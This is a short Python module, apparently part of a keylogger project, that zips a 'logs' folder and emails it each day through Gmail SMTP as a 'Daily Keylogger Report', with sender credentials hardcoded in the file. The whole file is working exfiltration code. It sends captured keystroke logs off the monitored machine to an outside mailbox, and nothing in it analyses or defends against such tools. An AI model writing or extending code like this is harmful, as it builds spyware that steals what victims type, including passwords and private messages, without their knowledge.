# email_report.py
import smtplib
import zipfile
import os
from email.message import EmailMessage
from datetime import datetime

EMAIL_ADDRESS = "yourmail9@gmail.com"
EMAIL_PASSWORD = "abcdefghijklmnop"  # Use App Password if using Gmail
TO_EMAIL = "yourmail@gmail.com"

def zip_logs(zip_path="report.zip"):
    with zipfile.ZipFile(zip_path, "w") as zipf:
        for folder_name, _, filenames in os.walk("logs"):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                zipf.write(file_path, os.path.relpath(file_path, "logs"))

def send_email(zip_path="report.zip"):
    msg = EmailMessage()
    msg["Subject"] = f"Daily Keylogger Report - {datetime.now().strftime('%Y-%m-%d')}"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg.set_content("Attached is the keylogger report for today.")

    with open(zip_path, "rb") as f:
        data = f.read()
        msg.add_attachment(data, maintype="application", subtype="zip", filename=zip_path)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

def send_daily_report():
    zip_logs()
    send_email()
